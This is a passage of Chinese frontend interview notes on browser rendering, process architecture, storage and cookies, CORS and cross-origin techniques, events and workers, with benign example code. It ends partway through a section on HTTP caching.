# 前端面试知识点详解 04：浏览器原理 + 网络 + 安全

> 对应总大纲 `docs/frontend-interview-outline.md` 第 5 节（浏览器原理）、第 6 节（网络）、第 10 节（安全）的展开。
> 考频标注：★★★ 必考 / ★★ 常考 / ★ 了解即可。内容以 2026 年主流浏览器（Chromium 系为主）为准。
> 每个知识点结构：**是什么 / 原理** → **示例** → **面试答题要点** → **易错点 / 追问**。

## 目录

- [一、浏览器原理](#一浏览器原理)
  - [1.1 输入 URL 到页面展示（10 分钟参考答案）★★★](#11-输入-url-到页面展示10-分钟参考答案)
  - [1.2 渲染流水线：重排、重绘、合成层、GPU 加速 ★★★](#12-渲染流水线重排重绘合成层gpu-加速)
  - [1.3 为什么 JS 会阻塞渲染 ★★★](#13-为什么-js-会阻塞渲染)
  - [1.4 多进程架构 ★★](#14-多进程架构)
  - [1.5 浏览器存储 ★★★](#15-浏览器存储)
  - [1.6 同源策略与跨域方案 ★★★](#16-同源策略与跨域方案)
  - [1.7 事件机制：捕获 / 冒泡 / 委托 ★★](#17-事件机制捕获--冒泡--委托)
  - [1.8 Web Worker / Service Worker / SharedArrayBuffer ★★](#18-web-worker--service-worker--sharedarraybuffer)
- [二、网络](#二网络)
  - [2.1 HTTP 缓存 ★★★](#21-http-缓存)
  - [2.2 HTTP/1.1 → HTTP/2 → HTTP/3 ★★★](#22-http11--http2--http3)
  - [2.3 HTTPS 握手与证书校验 ★★★](#23-https-握手与证书校验)
  - [2.4 TCP 三次握手 / 四次挥手 / 拥塞控制 ★★](#24-tcp-三次握手--四次挥手--拥塞控制)
  - [2.5 状态码、请求方法、幂等性 ★★](#25-状态码请求方法幂等性)
  - [2.6 实时通信：WebSocket / SSE / 长轮询 ★★★](#26-实时通信websocket--sse--长轮询)
  - [2.7 CDN 原理 ★★](#27-cdn-原理)
- [三、安全](#三安全)
  - [3.1 XSS ★★★](#31-xss)
  - [3.2 CSRF ★★★](#32-csrf)
  - [3.3 点击劫持 ★★](#33-点击劫持)
  - [3.4 依赖供应链安全 ★★](#34-依赖供应链安全)
  - [3.5 敏感信息与 Token 存储取舍 ★★](#35-敏感信息与-token-存储取舍)
- [四、高频题速答清单](#四高频题速答清单)

---

# 一、浏览器原理

## 1.1 输入 URL 到页面展示（10 分钟参考答案）

> 考频 ★★★。面试官真正想看的是：你能否把**网络、浏览器架构、渲染、性能优化**串成一条线，并在每个环节能被追问时继续深入。

### 全链路文字流程图

```
[浏览器进程] 地址栏输入
   │ ① 判断是搜索词还是 URL → 补全协议 → HSTS 预加载列表检查（命中则强制 https）
   │ ② beforeunload（旧页面可拦截）
   ▼
[网络进程] 发起导航请求
   │ ③ 查缓存：Service Worker → HTTP 缓存（强缓存命中则直接跳到 ⑨）
   │ ④ DNS 解析：浏览器缓存 → 系统缓存/hosts → 本地 DNS 服务器（递归）
   │              → 根 → 顶级域 → 权威（迭代）  [可走 DoH]
   │ ⑤ 建立连接：TCP 三次握手 → TLS 握手（1.3 为 1-RTT）
   │              或 HTTP/3：QUIC 一次握手同时完成传输 + 加密
   │ ⑥ 发送 HTTP 请求（携带 Cookie、If-None-Match 等）
   │ ⑦ 服务端处理（可能经 CDN / 网关 / 负载均衡）→ 返回响应
   │ ⑧ 处理响应：3xx 重定向则回到 ④；Content-Type 判断：
   │              text/html → 交给渲染；附件/下载 → 下载管理器
   ▼
[浏览器进程] 提交导航（Commit Navigation）
   │ ⑨ 按站点隔离策略选择/新建渲染进程，网络进程把响应体以数据流交给渲染进程
   │    渲染进程确认后：更新地址栏、历史记录、安全锁图标，旧页面卸载
   ▼
[渲染进程 主线程] 解析与渲染
   │ ⑩ HTML 字节 → 字符 → Token → DOM 树（预加载扫描器并行发现 css/js/img）
   │ ⑪ CSS → CSSOM（样式计算：层叠、继承、单位标准化）
   │ ⑫ 遇到同步 <script>：暂停解析，等待下载 + 前面 CSS 就绪 → 执行
   │ ⑬ DOM + CSSOM → 布局树（剔除 display:none）→ Layout 计算几何
   │ ⑭ 分层（Layer）→ Paint 生成绘制指令列表
   ▼
[合成线程 / GPU 进程]
   │ ⑮ 图层切分为图块（tile）→ 栅格化（GPU 光栅化）→ 合成帧
   │ ⑯ 提交给 GPU 进程显示到屏幕
   ▼
首帧展示（FP/FCP/LCP） → DOMContentLoaded → load → 后续交互（事件循环、重排重绘）
```

### 分阶段讲解（口述稿）

**阶段 1：URL 处理（约 1 分钟）**
- 浏览器进程的 UI 线程判断输入内容：不是合法 URL 就交给默认搜索引擎。
- 若域名在 HSTS 预加载列表中，或之前收到过 `Strict-Transport-Security`，直接内部 307 到 https，不发明文请求。
- 当前页面会触发 `beforeunload`，用户可取消导航。

**阶段 2：缓存检查（约 1 分钟）**
- 若该作用域注册了 Service Worker，先触发 `fetch` 事件，SW 可直接返回缓存。
- 否则查 HTTP 缓存：强缓存（`Cache-Control: max-age`）有效直接用；过期则带 `If-None-Match` / `If-Modified-Since` 去协商，304 即复用本地副本。
- 注意：普通刷新时 Chromium 对主文档会重新验证，子资源仍可用强缓存。

**阶段 3：DNS 解析（约 1 分钟）**
- 顺序：浏览器 DNS 缓存 → 操作系统缓存（含 hosts）→ 本地 DNS 服务器（递归查询）→ 本地 DNS 再对根、顶级域（.com）、权威 DNS 做迭代查询。
- 优化：`<link rel="dns-prefetch">`、`preconnect`；CDN 依赖 DNS 的 CNAME + 智能调度返回就近 IP。
- 现代浏览器可开启 DoH（DNS over HTTPS）防劫持。

**阶段 4：建立连接（约 1.5 分钟）**
- TCP 三次握手（1 RTT），HTTPS 再加 TLS 握手：TLS 1.2 需 2 RTT，TLS 1.3 需 1 RTT，会话恢复可 0-RTT。
- HTTP/2 下同域只需一条连接；HTTP/3 基于 QUIC（UDP），握手把传输和加密合并，首连 1 RTT。
- 浏览器通过 `Alt-Svc` 响应头或 DNS HTTPS 记录得知服务端支持 h3。
- HTTP/1.1 下同域名最多 6 个并发 TCP 连接。

**阶段 5：请求与响应（约 1 分钟）**
- 请求行 + 请求头（Host、Cookie、User-Agent、Accept-Encoding 等）+ 请求体。
- 服务端可能经过 CDN 边缘节点、负载均衡、网关，最终返回状态码 + 响应头 + 响应体（通常 gzip/br 压缩）。
- 301/302/307/308 重定向会重新走 DNS→连接→请求；`Set-Cookie` 由网络进程写入 Cookie 存储。
- 网络进程做 MIME 嗅探与 CORB/ORB 检查，`text/html` 才进入渲染流程。

**阶段 6：提交导航与进程分配（约 0.5 分钟）**
- 浏览器进程根据 Site Isolation 为该站点（scheme + eTLD+1）分配渲染进程；同站点的新标签页可能复用。
- 网络进程与渲染进程建立数据管道，边下载边解析（流式），不必等整个 HTML 下载完。

**阶段 7：解析 HTML 与 CSS（约 2 分钟）**
- HTML 解析：字节 → 根据编码转字符 → 词法分析成 Token → 构建 DOM 树。HTML 解析器容错性强，不会因语法错误中断。
- **预加载扫描器**（preload scanner）在主解析器被脚本阻塞时，提前扫描后续 HTML 发现资源并发起下载。
- CSS 解析成 CSSOM，并进行样式计算（层叠、继承、`em/rem` 转 `px`、颜色标准化）得到每个节点的 ComputedStyle。
- CSS 不阻塞 DOM 解析，但阻塞渲染，也阻塞其后同步 JS 的执行（JS 可能读取样式）。
- 同步 `<script>` 阻塞 DOM 解析；`defer` 在解析完成后、`DOMContentLoaded` 前按顺序执行；`async` 下载完立刻执行、顺序不定。

**阶段 8：布局、分层、绘制、合成（约 2 分钟）**
- 布局（Layout）：根据 DOM 与 ComputedStyle 生成布局树，计算每个盒子的位置和尺寸。
- 分层：带 `transform`/`opacity` 动画、`will-change`、`position: fixed`、`<video>`/`<canvas>` 等会提升为独立合成层。
- 绘制（Paint）：主线程为每层生成绘制指令列表（display list），并不真正画像素。
- 合成线程把图层切成图块，交给 GPU 栅格化，优先视口附近图块，生成合成帧（Compositor Frame）交给 GPU 进程上屏。
- 之后触发 `DOMContentLoaded`（DOM 解析完 + defer 脚本执行完）和 `load`（所有子资源加载完）。

**收尾：可延伸的优化点（加分）**
- 网络层：DNS 预解析、preconnect、HTTP/2/3、CDN、压缩、缓存策略。
- 渲染层：关键 CSS 内联、JS `defer`、减少首屏重排、图片懒加载、`fetchpriority="high"` 提升 LCP 图片优先级。
- 指标：TTFB、FCP、LCP、INP、CLS。

### 面试答题要点
1. 按「URL 处理 → 缓存 → DNS → 连接 → 请求响应 → 提交导航 → 解析 → 布局绘制合成」分阶段讲，每阶段点出负责的进程。
2. 网络部分点出 TLS 1.3 / HTTP/3 的 RTT 优化，体现知识更新。
3. 渲染部分讲清「CSS 阻塞渲染、JS 阻塞解析」与预加载扫描器。
4. 最后落到性能优化和指标，把知识点变成工程能力。

### 易错点 / 追问
- **DOM 和 CSSOM 是并行构建的**，不是先 DOM 后 CSSOM；布局树需要两者都就绪。
- **`display:none` 不在布局树中，`visibility:hidden` 在。**
- 追问「DNS 用 TCP 还是 UDP」：一般查询 UDP 53，响应超过 512 字节（未启用 EDNS）或区域传送用 TCP。
- 追问「Keep-Alive 下还要三次握手吗」：复用连接无需重复握手。
- 追问「首屏白屏怎么排查」：Performance 面板看 TTFB、阻塞资源、长任务；Network 看瀑布图。

---

## 1.2 渲染流水线：重排、重绘、合成层、GPU 加速

> 考频 ★★★

### 是什么 / 原理

一帧画面的流水线（Chromium 简化版）：

```
JS / 动画 → Style（样式计算）→ Layout（布局）→ Paint（生成绘制指令）
         → Composite（分层、栅格化、合成，主要在合成线程 + GPU）
```

| 操作 | 触发阶段 | 代价 | 典型触发 |
|---|---|---|---|
| 重排（Reflow / Layout） | Layout → Paint → Composite 全走 | 最高 | 改 width/height/margin/font-size、增删 DOM、读 offsetTop 等 |
| 重绘（Repaint） | 跳过 Layout，Paint → Composite | 中 | 改 color、background、visibility、box-shadow |
| 仅合成 | 跳过 Layout 和 Paint | 最低 | 改 `transform`、`opacity`（且元素已在独立合成层） |

**重排一定引起重绘，重绘不一定引起重排。**

**强制同步布局（Layout Thrashing）**：浏览器本会把样式修改批量放到下一帧处理，但读取 `offsetWidth`、`getBoundingClientRect()`、`scrollTop`、`getComputedStyle()` 等布局属性会迫使其立即计算布局。

**合成层提升条件**（常见）：3D transform / `translateZ(0)`、`will-change: transform|opacity`、对 `transform/opacity` 做的 CSS 动画、`<video>` `<canvas>` `<iframe>`、`position: fixed`（视实现而定）、与其他合成层重叠且在其上方（隐式提升，可能导致**层爆炸**）。

**GPU 加速**的本质：合成层的栅格化和合成在 GPU 完成；`transform/opacity` 动画在合成线程独立运行，即使主线程被长任务阻塞也能流畅。

### 代码示例

```js
// ❌ 读写交替 → 每次循环都强制同步布局
for (const el of items) {
  el.style.width = box.offsetWidth + 'px';
}

// ✅ 先批量读，再批量写
const w = box.offsetWidth;
for (const el of items) el.style.width = w + 'px';

// ✅ 写操作放到下一帧
requestAnimationFrame(() => { el.classList.add('expanded'); });
```

```css
/* ✅ 用 transform 做位移动画，而不是 left/top */
.toast { transition: transform .3s, opacity .3s; will-change: transform; }
.toast.show { transform: translateY(0); opacity: 1; }

/* ✅ 限制布局影响范围 */
.card { contain: layout paint; }
.long-list-item { content-visibility: auto; contain-intrinsic-size: 0 80px; }
```

### 面试答题要点
1. 流水线：Style → Layout → Paint → Composite，改动越靠前，代价越大。
2. 重排改几何、重绘改外观、`transform/opacity` 只走合成。
3. 避免读写交替导致强制同步布局；批量修改用 class、`DocumentFragment`、rAF。
4. 合成层由 GPU 处理，动画可脱离主线程；但层过多会占显存（层爆炸），`will-change` 不要滥用。
5. 现代手段：`contain`、`content-visibility` 缩小布局 / 绘制范围。

### 易错点 / 追问
- `will-change` 加太多反而增加内存，应在动画前加、结束后移除。
- `visibility: hidden` 只重绘；`display: none` 触发重排。
- 追问「为什么 transform 动画不卡」：合成线程独立处理，不依赖主线程的 Layout/Paint。
- 追问「如何定位重排」：DevTools Performance 面板中紫色 Layout 块、"Forced reflow" 警告；Rendering 面板开 Paint flashing / Layer borders。

---

## 1.3 为什么 JS 会阻塞渲染

> 考频 ★★★

### 是什么 / 原理
- **JS 与渲染共用主线程**：主线程同一时刻只能做一件事，执行 JS 时无法做 Style/Layout/Paint。超过 50ms 的任务称为长任务（Long Task），直接影响 INP。
- **JS 可修改 DOM / CSSOM**：`document.write`、修改样式等，解析器无法预知，只能遇到同步 `<script>` 时暂停 HTML 解析，等待脚本下载并执行。
- **CSS 阻塞 JS 执行**：脚本可能读取 `getComputedStyle`，所以同步脚本要等前面的 CSS 加载解析完 → 间接形成 CSS 阻塞 DOM 解析。

### 代码示例

```html
<head>
  <link rel="stylesheet" href="/app.css">          <!-- 阻塞渲染 -->
  <script src="/a.js"></script>                     <!-- 阻塞解析，且等 app.css -->
  <script defer src="/b.js"></script>               <!-- 并行下载，解析完后按序执行 -->
  <script async src="/analytics.js"></script>       <!-- 并行下载，下载完立即执行 -->
  <script type="module" src="/main.js"></script>    <!-- 默认 defer 行为 -->
  <link rel="preload" href="/hero.webp" as="image" fetchpriority="high">
</head>
```

| 属性 | 下载 | 执行时机 | 顺序 | 适用 |
|---|---|---|---|---|
| 无 | 阻塞解析 | 下载完立即执行 | 按序 | 必须提前执行的少量脚本 |
| `defer` | 并行 | DOM 解析完、DOMContentLoaded 前 | 按序 | 业务主脚本 |
| `async` | 并行 | 下载完立即执行（可能打断解析） | 不定 | 独立的统计、广告 |
| `type=module` | 并行 | 同 defer（加 async 则同 async） | 按序 | 现代 ESM |

### 面试答题要点
1. 主线程单线程，JS 执行和渲染互斥。
2. 同步脚本阻塞 HTML 解析，因为 JS 可能改 DOM。
3. CSS 阻塞渲染和后续 JS 执行，但不直接阻塞 DOM 解析。
4. 解法：`defer/async/module`、脚本放 body 底部、拆分长任务（`scheduler.yield()`、`setTimeout` 切片）、计算放 Worker。

### 易错点 / 追问
- 「CSS 阻塞 DOM 解析吗？」—— 不直接阻塞，但若后面有同步 JS，JS 需等 CSS，于是间接阻塞。
- 「`defer` 脚本一定在 DOMContentLoaded 前执行吗？」—— 是的；`async` 不保证。
- 动态插入的 `<script>` 默认是 async 行为（可设 `script.async = false` 保序）。

---

## 1.4 多进程架构

> 考频 ★★

### 是什么 / 原理（Chromium）

| 进程 | 职责 |
|---|---|
| 浏览器进程（Browser） | 地址栏、书签、前进后退等 UI；子进程管理；导航调度；存储协调 |
| 渲染进程（Renderer） | 每站点一个（Site Isolation），运行 Blink 与 V8：解析、样式、布局、绘制、JS；运行在沙箱中 |
| GPU 进程 | 栅格化、合成上屏，统一处理所有进程的 GPU 调用 |
| 网络进程（Network Service） | 所有网络请求、DNS、Cookie 存储、HTTP 缓存 |
| 存储进程 / Utility 进程 | Storage Service、音视频解码、数据解码等 |
| 插件 / 扩展进程 | 扩展运行环境 |

渲染进程内部的主要线程：**主线程**（JS、DOM、样式、布局、绘制指令）、**合成线程**（分层、图块、处理滚动和合成动画）、**光栅线程**、**Worker 线程**、IO 线程。

### 面试答题要点
1. 多进程带来**稳定性**（一个标签崩溃不影响其他）、**安全性**（渲染进程沙箱化）、**性能**（并行）。
2. Site Isolation：不同站点放入不同渲染进程，配合 CORB/ORB 防御 Spectre 侧信道读取跨站数据。
3. 代价是内存占用高；Chromium 会在内存紧张时合并同站点进程。
4. 合成线程独立于主线程，所以滚动和 transform 动画在 JS 繁忙时仍可流畅。

### 易错点 / 追问
- 「一个标签页一个进程」是旧说法，现在按**站点**（scheme + eTLD+1）划分，同站 iframe 共进程，跨站 iframe（OOPIF）独立进程。
- 「浏览器是单线程的吗？」—— JS 执行在单个主线程上，但浏览器整体是多进程多线程。

---

## 1.5 浏览器存储

> 考频 ★★★

### 对比表

| 维度 | Cookie | localStorage | sessionStorage | IndexedDB | Cache Storage |
|---|---|---|---|---|---|
| 容量 | 单条约 4KB，每域约 50+ 条 | 约 5MB/源 | 约 5MB/源 | 磁盘配额的较大比例（可达 GB 级） | 同 IndexedDB 共享配额 |
| 生命周期 | `Expires/Max-Age` 或会话 | 永久，手动清除 | 标签页关闭即清 | 永久 | 永久 |
| 作用域 | Domain + Path，可跨子域 | 同源 | 同源 + 同一标签页 | 同源 | 同源 |
| 随请求发送 | 自动携带 | 否 | 否 | 否 | 否 |
| API | 同步字符串 | 同步 | 同步 | 异步、事务、索引 | 异步，存 Request/Response |
| Worker 可访问 | 否（`cookieStore` 部分支持） | 否 | 否 | 是 | 是 |
| 典型用途 | 会话标识、鉴权 | 用户偏好、小量缓存 | 表单草稿、单页临时态 | 离线数据、大量结构化数据 | PWA 离线资源 |

### Cookie 关键属性

```http
Set-Cookie: sid=abc123; Path=/; Domain=example.com; Max-Age=86400; Secure; HttpOnly; SameSite=Lax
Set-Cookie: __Host-csrf=xyz; Path=/; Secure; SameSite=Strict
```

| 属性 | 作用 |
|---|---|
| `HttpOnly` | JS（`document.cookie`）无法读取，降低 XSS 窃取会话的风险 |
| `Secure` | 仅通过 HTTPS 发送 |
| `Domain` | 不设则仅当前主机；设为 `example.com` 则子域共享 |
| `Path` | 路径前缀匹配 |
| `Max-Age` / `Expires` | 过期时间，Max-Age 优先；都不设为会话 Cookie |
| `SameSite` | 控制跨站请求是否携带 |
| `__Host-` 前缀 | 必须 Secure、Path=/、不能设 Domain，防子域覆盖 |
| `Partitioned` | CHIPS 分区 Cookie，第三方 Cookie 按顶级站点隔离 |

### SameSite 三个值（★★★）

| 值 | 跨站请求携带行为 | 举例 |
|---|---|---|
| `Strict` | 任何跨站请求都不携带，包括从外站点击链接跳过来 | 从邮件点链接进入银行网站，首次请求没有登录态 |
| `Lax` | 仅**顶级导航**且方法安全（GET）时携带；跨站的 POST 表单、iframe、img、fetch 都不带 | 从外站点链接进来保持登录；外站 POST 表单不带 Cookie |
| `None` | 都携带，**必须同时设置 `Secure`**，否则 Cookie 被拒绝 | 第三方嵌入、跨站 SSO |

**默认值**：Chromium 自 2020 年（Chrome 80）起，未声明 SameSite 的 Cookie 按 `Lax` 处理（"Lax by default"）；并对未声明 SameSite 的 Cookie 有一个「Lax + POST」宽限：设置后 2 分钟内允许跨站顶级 POST 携带（为兼容 SSO 回调）。Firefox、Safari 未全面落地 Lax by default，但 Safari ITP 默认阻止第三方 Cookie、Firefox 默认启用 Total Cookie Protection（按站点分区）。**结论：显式声明 SameSite，不要依赖默认值。**

**「跨站」的定义**：看 **site = scheme + eTLD+1**（如 `https://example.com`），`a.example.com` 与 `b.example.com` 是**同站跨源**，SameSite 不拦截。

### 面试答题要点
1. Cookie 会自动随请求携带，容量小，适合存会话标识；Web Storage 不随请求、同步 API、只能存字符串。
2. sessionStorage 绑定标签页：同一页面新开标签（`window.open` 复制）会拷贝一份，但之后独立。
3. IndexedDB 异步、支持事务和索引，适合大量数据；Cache Storage 配合 SW 做离线。
4. Cookie 安全三件套：`HttpOnly` + `Secure` + `SameSite`。
5. 第三方 Cookie 现状：Safari/Firefox 默认拦截或分区；Chrome 在 2025 年宣布不再强制淘汰第三方 Cookie，但推荐用 CHIPS（`Partitioned`）、Storage Access API 等方案。

### 易错点 / 追问
- localStorage 是**同步**的，大数据读写会阻塞主线程。
- `storage` 事件只在**其他**同源标签页触发，可用于跨标签页通信（也可用 `BroadcastChannel`）。
- 无痕模式下存储在关闭后清除；Safari 对脚本写入的存储有 7 天不活跃清除策略。
- SameSite 防的是**跨站**，不防同站子域发起的 CSRF。
- `SameSite=None` 不加 `Secure` 会被直接丢弃。

---

## 1.6 同源策略与跨域方案

> 考频 ★★★

### 同源策略
**同源 = 协议 + 域名 + 端口完全相同。** 限制内容：
- 不能读取跨源 `fetch/XHR` 的响应（请求其实**能发出去**，是浏览器拦截了响应）；
- 不能访问跨源 iframe 的 DOM；
- 不能读取跨源的 Cookie / Storage / IndexedDB。

不受限：`<img> <script> <link> <iframe> <video>` 的**嵌入加载**、表单提交、跳转（这也是 CSRF 存在的原因）。

### CORS（★★★）

#### 简单请求判定（同时满足才算，否则触发预检）

1. 方法是 `GET`、`HEAD`、`POST` 之一；
2. 只设置了 CORS 安全列表请求头（浏览器自动添加的 User-Agent、Connection 等不算）：`Accept`、`Accept-Language`、`Content-Language`、`Content-Type`、`Range`（仅简单区间值）；
3. `Content-Type` 只能是 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain` 之一；
4. XHR 未在 `xhr.upload` 上注册事件监听；请求体不是 `ReadableStream`。

（另有细则：安全列表请求头单个值不超过 128 字节、总计不超过 1024 字节，值不能含非法字符。）

**常见触发预检的情况**：`Content-Type: application/json`、携带 `Authorization` 或任意自定义头（如 `X-Token`）、使用 `PUT/DELETE/PATCH`。

#### 流程

```
简单请求：
  浏览器 ──(带 Origin)──▶ 服务端
         ◀── Access-Control-Allow-Origin ── 匹配则 JS 可读响应，否则报 CORS 错误

预检请求：
  浏览器 ── OPTIONS + Origin + Access-Control-Request-Method/Headers ──▶ 服务端
         ◀── 204 + Allow-Origin/Methods/Headers + Max-Age ──
  通过 ──▶ 发送真实请求 ──▶ 正常响应（仍需 Allow-Origin）
  不通过 ──▶ 真实请求不会发出
```

#### 响应头配置示例

```http
# 预检响应
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
Vary: Origin

# 真实请求响应
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: X-Request-Id
Vary: Origin
```

```js
// 前端携带 Cookie
fetch('https://api.example.com/user', { credentials: 'include' });
// axios: axios.get(url, { withCredentials: true })
```

```js
// Node/Express：白名单动态回写 Origin
const allow = new Set(['https://app.example.com', 'https://admin.example.com']);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allow.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
    res.setHeader('Access-Control-Max-Age', '600');
    return res.sendStatus(204);
  }
  next();
});
```

### 其他跨域方案

| 方案 | 原理 | 适用 |
|---|---|---|
| 开发代理（Vite/webpack devServer） | 本地 Node 服务转发，服务端之间无同源限制 | 本地开发 |
| Nginx 反向代理 / BFF | 前端与接口同域，Nginx 转发到后端 | 生产首选之一 |
| `postMessage` | 窗口间消息通信 | iframe、弹窗、跨源页面通信 |
| JSONP | `<script>` 不受同源限制，回调函数包裹数据 | 仅 GET，有 XSS 风险，已过时 |
| WebSocket | 不受同源策略限制（服务端需校验 Origin） | 实时通信 |
| `document.domain` | 同主域子域间降级 | **已被弃用**，Chrome 默认禁用 |

```nginx
location /api/ {
  proxy_pass http://backend:8080/;
  proxy_set_header Host $host;
  proxy_set_header X-Real-IP $remote_addr;
}
```

```js
// postMessage：务必指定 targetOrigin 并校验 event.origin
iframe.contentWindow.postMessage({ type: 'token', value: t }, 'https://child.example.com');

window.addEventListener('message', (e) => {
  if (e.origin !== 'https://parent.example.com') return;
  handle(e.data);
});
```

### 面试答题要点
1. 同源 = 协议 + 域名 + 端口；跨域请求能发出，是浏览器拦截了响应。
2. 简单请求条件：方法 GET/HEAD/POST + 仅安全列表头 + Content-Type 三种之一；否则先发 OPTIONS 预检。
3. 带 Cookie：前端 `credentials: 'include'`，后端 `Allow-Credentials: true` 且 `Allow-Origin` 不能为 `*`。
4. 生产常用 Nginx 反代 / BFF 同域化，开发用 devServer proxy；窗口通信用 postMessage。
5. `Access-Control-Max-Age` 缓存预检结果，减少 OPTIONS 次数。

### 易错点 / 追问
- 带凭证时 `Allow-Origin`、`Allow-Headers`、`Allow-Methods` 都不能用 `*`。
- 动态回写 Origin 必须加 `Vary: Origin`，否则 CDN 可能把 A 域的响应缓存给 B 域。
- 预检请求本身不带 Cookie；服务端鉴权中间件要放行 OPTIONS，否则预检 401。
- 「为什么 POST JSON 会多一个请求？」—— `application/json` 不在简单类型内。
- 简单请求即使 CORS 失败，**服务端也已经执行了**，所以 CORS 不是防 CSRF 的手段。
- Chrome 的 Private Network Access：公网页面访问内网地址会有额外预检（`Access-Control-Request-Private-Network`）。

---

## 1.7 事件机制：捕获 / 冒泡 / 委托

> 考频 ★★

### 是什么 / 原理
DOM 事件流三阶段：**捕获阶段**（window → 目标父级）→ **目标阶段** → **冒泡阶段**（目标 → window）。

```
window → document → html → body → ul → li(target)     捕获 ↓
window ← document ← html ← body ← ul ← li(target)     冒泡 ↑
```

`addEventListener(type, handler, options)`：
- `capture: true` 在捕获阶段触发；默认冒泡阶段；
- `once: true` 触发一次后自动移除；
- `passive: true` 声明不会调用 `preventDefault`，滚动优化（Chrome 对 window/document 上的 touchstart/wheel 默认 passive）；
- `signal`：配合 `AbortController` 批量移除。

### 代码示例：事件委托

```js
// 一个监听器处理所有列表项，含动态新增的项
list.addEventListener('click', (e) => {
  const item = e.target.closest('li[data-id]');
  if (!item || !list.contains(item)) return;
  console.log('点击了', item.dataset.id);
});

// AbortController 一次性解绑
const ac = new AbortController();
window.addEventListener('resize', onResize, { signal: ac.signal });
window.addEventListener('scroll', onScroll, { signal: ac.signal, passive: true });
ac.abort();
```

### 面试答题要点
1. 三阶段：捕获 → 目标 → 冒泡；`addEventListener` 第三参数控制阶段。
2. `e.target` 是实际触发的元素，`e.currentTarget` 是绑定监听器的元素。
3. 事件委托利用冒泡，减少监听器数量、天然支持动态节点；用 `closest` 精确匹配。
4. `stopPropagation` 阻止传播，`stopImmediatePropagation` 还阻止同元素上其他监听器，`preventDefault` 阻止默认行为。

### 易错点 / 追问
- 不冒泡的事件：`focus/blur`（用 `focusin/focusout` 替代）、`mouseenter/mouseleave`、`load`、`unload`、媒体事件等；元素上的 `scroll` 不冒泡。
- React 17+ 把事件委托挂在**根容器**而不是 document。
- 在 `passive` 监听器中调用 `preventDefault` 会被忽略并警告。
- 委托时 `e.target` 可能是子元素（如 li 里的 span），必须用 `closest`。

---

## 1.8 Web Worker / Service Worker / SharedArrayBuffer

> 考频 ★★

### 对比

| 维度 | Dedicated Worker | Shared Worker | Service Worker |
|---|---|---|---|
| 作用 | 后台线程执行计算 | 多个同源页面共享一个 Worker | 网络代理、离线缓存、推送 |
| 生命周期 | 随页面 | 所有连接页面关闭后结束 | 独立于页面，事件驱动，空闲会被终止 |
| DOM 访问 | 否 | 否 | 否 |
| 通信 | `postMessage` | `port.postMessage` | `postMessage`、`clients` API |
| 要求 | 同源脚本 | 同源脚本 | **HTTPS**（localhost 除外） |

### Web Worker 示例

```js
// main.js
const worker = new Worker(new URL('./hash.worker.js', import.meta.url), { type: 'module' });
worker.postMessage(file);                      // 结构化克隆
worker.onmessage = (e) => console.log('hash:', e.data);

// 大块二进制用 Transferable 零拷贝转移所有权
worker.postMessage(buffer, [buffer]);

// hash.worker.js
self.onmessage = async (e) => {
  const buf = await e.data.arrayBuffer();
  const digest = await crypto.subtle.digest('SHA-256', buf);
  self.postMessage([...new Uint8Array(digest)].map(b => b.toString(16).padStart(2, '0')).join(''));
};
```

### Service Worker 示例

```js
// 注册
if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js');

// sw.js
const CACHE = 'static-v2';
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(['/', '/app.css', '/app.js'])));
  self.skipWaiting();                      // 新 SW 立即进入 activate
});
self.addEventListener('activate', (e) => {
  e.waitUntil(caches.keys().then(keys =>
    Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))));
  self.clients.claim();                    // 立即接管已打开页面
});
self.addEventListener('fetch', (e) => {    // 缓存优先，回退网络
  e.respondWith(caches.match(e.request).then(r => r || fetch(e.request)));
});
```

常见缓存策略：Cache First（静态资源）、Network First（API、HTML）、Stale-While-Revalidate（头像、配置）。

### SharedArrayBuffer
- 多线程**共享同一块内存**，配合 `Atomics` 做同步（`Atomics.wait/notify`），用于 WASM 多线程、音视频处理。
- 因 Spectre 漏洞，要求页面处于**跨源隔离**（`crossOriginIsolated === true`）：

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp      # 或 credentialless
```

### 面试答题要点
1. Web Worker 解决主线程计算阻塞，不能操作 DOM，通过结构化克隆或 Transferable 通信。
2. Service Worker 是可编程网络代理，生命周期 install → activate → fetch，要求 HTTPS。
3. SW 更新：新 SW 处于 waiting，旧页面全部关闭后才激活；`skipWaiting + clients.claim` 可立即接管但要处理新旧资源不一致。
4. SharedArrayBuffer 需 COOP + COEP 实现跨源隔离。

### 易错点 / 追问
- SW 文件本身要设置 `Cache-Control: no-cache`（浏览器对 SW 脚本更新检查最多缓存 24 小时）。
- SW 作用域默认是脚本所在路径及其子路径。
- 开启 COEP 后，跨源资源需要返回 `Cross-Origin-Resource-Policy` 或支持 CORS，否则加载失败。
- OffscreenCanvas 可把 canvas 渲染交给 Worker。

---

# 二、网络

## 2.1 HTTP 缓存

> 考频 ★★★

### 是什么 / 原理

**强缓存**：在有效期内直接使用本地副本，**不发请求**（DevTools 显示 `200 (from memory cache / disk cache)`）。
- `Cache-Control`（HTTP/1.1，优先级高）：`max-age=秒`，相对时间。
- `Expires`（HTTP/1.0）：绝对时间，依赖客户端时钟，被 `max-age` 覆盖。

**协商缓存**：缓存过期（或要求每次验证）时，带条件请求问服务端「我的副本还能用吗」，能用则返回 **304 Not Modified**（无响应体）。
- `ETag` / `If-None-Match`：资源内容指纹，精确，优先级高。
- `Last-Modified` / `If-Modified-Since`：最后修改时间，秒级精度。

**Cache-Control 常用指令**

| 指令 | 含义 |
|---|---|
| `max-age=N` | 新鲜期 N 秒 |
| `s-maxage=N` | 仅对共享缓存（CDN/代理）生效，覆盖 max-age |
